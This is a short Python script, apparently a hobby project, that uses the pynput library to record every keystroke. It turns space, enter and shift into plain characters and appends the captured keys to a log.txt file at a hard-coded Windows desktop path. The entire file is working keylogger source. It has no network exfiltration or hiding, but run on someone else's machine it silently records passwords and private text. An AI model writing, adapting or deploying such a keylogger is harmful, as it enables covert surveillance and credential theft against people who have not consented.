from pynput.keyboard import Listener

def writetofile(key):
    letter = str(key)
    letter = letter.replace("'", "")
    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift':
        letter = ''

    if letter == 'Key.enter':
        letter = '\n'

    with open("C:\\Users\\Duly Florist\\Desktop\\Python Projects\\Keylogger\\log.txt", "a") as f:
        f.write(letter)
with Listener(on_press=writetofile) as l:
    l.join()